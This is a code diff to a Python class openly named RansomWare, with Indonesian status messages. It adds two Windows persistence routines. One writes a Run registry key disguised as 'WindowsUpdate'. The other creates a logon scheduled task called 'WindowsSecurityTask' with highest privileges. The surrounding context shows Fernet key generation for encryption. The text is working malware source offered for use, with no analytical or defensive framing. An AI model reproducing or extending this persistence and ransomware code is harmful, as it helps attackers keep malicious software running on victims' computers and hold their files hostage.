@@ -285,6 +285,38 @@ class RansomWare:
         except Exception as e:
             print("[✗] Gagal tambah persistence:", e)
 
+
+    def _add_registry_persistence(self):
+        import os
+        import sys
+        import winreg
+
+        try:
+            exe_path = sys.executable
+            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
+                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
+                print("[✓] Persistence via registry berhasil.")
+        except Exception as e:
+            print("[✗] Gagal tambah registry persistence:", e)
+
+
+    def _add_scheduled_task(self):
+        import subprocess
+        import sys
+
+        try:
+            exe_path = sys.executable
+            task_name = "WindowsSecurityTask"
+            cmd = f'schtasks /Create /SC ONLOGON /TN {task_name} /TR "{exe_path}" /RL HIGHEST /F'
+            result = subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            if result.returncode == 0:
+                print("[✓] Persistence via scheduled task berhasil.")
+            else:
+                print("[✗] Gagal menambahkan scheduled task.")
+        except Exception as e:
+            print("[✗] Error saat menambahkan scheduled task:", e)
+
     def generate_key(self):
         # Generates a url safe(base64 encoded) key
         self.key = Fernet.generate_key()
